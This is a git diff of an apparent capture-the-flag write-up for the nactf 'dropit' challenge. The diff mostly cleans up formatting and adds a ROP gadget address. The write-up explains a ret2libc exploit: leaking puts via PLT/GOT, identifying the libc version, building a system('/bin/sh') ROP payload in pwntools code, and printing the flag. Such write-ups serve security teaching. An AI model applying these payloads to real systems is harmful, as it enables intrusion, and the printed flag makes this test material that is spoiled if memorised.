@@ -34,8 +34,8 @@ if _remote:
 else:
 	proc=process(prog)
 	#ldd dropit <-- to check the libc in your environment
-	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")				<<==== modify this path to the patch of your libc file
-															<<==== can find with "ldd dropit" command
+	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")		<<==== modify this path to the patch of your libc file
+								<<==== can find with "ldd dropit" command
 ......
 ......
 ......
@@ -61,8 +61,6 @@ $checksec dropit
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-
-
 ```
 
 ok there is only RELRO and NX enabled. at least we don't have to deal with PIE...  
@@ -148,7 +146,7 @@ therefor, the first thing we have to know some __leak address__ then find the __
 
 ---
 
-### __ 1. leak address __ 
+### 1. leak address  
 
 disassemble main(), 2 things we can leverage.
 setvbuf@plt 	<-- a pointer to GOT(Gobal offerset table) of setvbuf@libc  
@@ -184,8 +182,10 @@ End of assembler dump.
 we can leverage ROP to leak the address of libc function(setvbuf,puts,fgets). to let the function run __puts(*puts@libc)__  
 simple explain of the PLT and GOT 
 >.plt - For dynamic binaries, this Procedure Linkage Table holds the trampoline/linkage code.  
->.got - For dynamic binaries, this Global Offset Table holds the addresses of variables which are relocated upon loading.  
-[!img](./img/1.png)  
+>.got - For dynamic binaries, this Global Offset Table holds the addresses of variables which are relocated upon loading.
+
+![img](./img/1.png)
+
 detail can be found on [PLT and GOT](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)  
 
 so we just let the program run __puts@plt(*puts@got)__, that both thing we can find in the program that will lead us to find the address of puts@libc  
@@ -214,7 +214,9 @@ High Address |                 |
 args1-6 are in %rdi,%rds,%rdx,%rxc,%r8 and %r9
 
 ```
+
 [!img](./img/2.png)
+
 detail can be found on [Stack frame layout on x86-64](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64) 
 
 let it be simple, to construct __puts@plt(*puts@got)__  
@@ -243,6 +245,11 @@ High Address |   __puts@plt    |
 
 so, the leak payload should be like this 
 ```python
+
+#ROPgadget --binary dropit --only "pop|ret"
+#0x0000000000401203 : pop rdi ; ret
+pop_rdi_ret=0x0000000000401203
+
 #################################################################
 ##
 ## payload 1 for libc addresss leaking
@@ -265,9 +272,10 @@ libc_puts=unpack("Q",raw_byte[:-1].ljust(8, '\x00'))[0]
 ```
 
 bingo!
-[!img](./img/1.png)
 
-### __ 2. get the libc__  
+![img](./img/3.png)
+
+### 2. get the libc   
 
 we can use __d90__ and __puts__ to found the libc version on https://libc.rip
 then we find the libc version should be  
@@ -275,7 +283,7 @@ libc6_2.32-0ubuntu2_amd64
 or  
 libc6_2.32-0ubuntu3_amd64  
 
-### __3. find the address of system(), '/bin/sh' and construct payload__  
+### 3. find the address of system(), '/bin/sh' and construct payload  
 
 we can find the offset of 
 ```
@@ -299,7 +307,7 @@ as the libc will be load into memory with same sequence.
 thence, we can easily calculate the base address of libc.and construct the payload as previous.  
 but there is little tricky in that version of libc, we have to align the RSP as below link mentioned.
 https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul
-```
+```python
 # caluelate the base address of libc
 libc_base=libc_puts-libc.symbols['puts']
 # caluelate the system() address of libc
@@ -324,7 +332,8 @@ payload4 += pack("Q",libc_binsh)
 payload4 += pack("Q",libc_system) # system@libc('/bin/sh'@libc)
 ``` 
  
-### __4. get shell!!__
-[!img](./img/4.png)
+### 4. get shell!!  
+
+![img](./img/4.png)
 
 >nactf{r0p_y0ur_w4y_t0_v1ct0ry_698jB84iO4OH1cUe}
